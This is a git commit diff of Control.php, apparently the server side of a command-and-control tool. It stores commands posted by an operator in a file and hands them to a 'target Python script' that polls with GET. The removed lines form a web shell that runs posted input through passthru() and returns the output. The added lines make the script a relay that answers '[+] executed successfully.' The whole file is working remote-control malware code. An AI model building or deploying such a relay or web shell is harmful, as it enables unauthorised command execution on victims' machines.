e7d3d9c10b0337ad419ec01df7c82b9562bdb09f
AbdulazizDXT <143551117+AzizDXT@users.noreply.github.com>
2023-09-29 00:35:01 +0400

    Update Control.php

--- Control.php
+++ Control.php
@@ -1,18 +1,9 @@
+<?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Handle data received from the Python script
     $data = $_POST['data'];
     file_put_contents('Data.io', $data); // Save the data to a file
-
-    // Execute the command and capture its output
-    ob_start();
-    passthru($data, $return_code);
-    $command_output = ob_get_clean();
-
-    // Send the command output and return code to the Python script
-    echo json_encode([
-        'command_output' => $command_output,
-        'command_error' => ($return_code === 0) ? '' : 'Command failed with error code ' . $return_code,
-    ]);
+    echo "[+] executed successfully.\n";
 } else if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     // Handle requests from the target Python script
     $data = file_get_contents('Data.io');
@@ -24,3 +15,4 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         echo "No data available.\n";
     }
 }
+?>
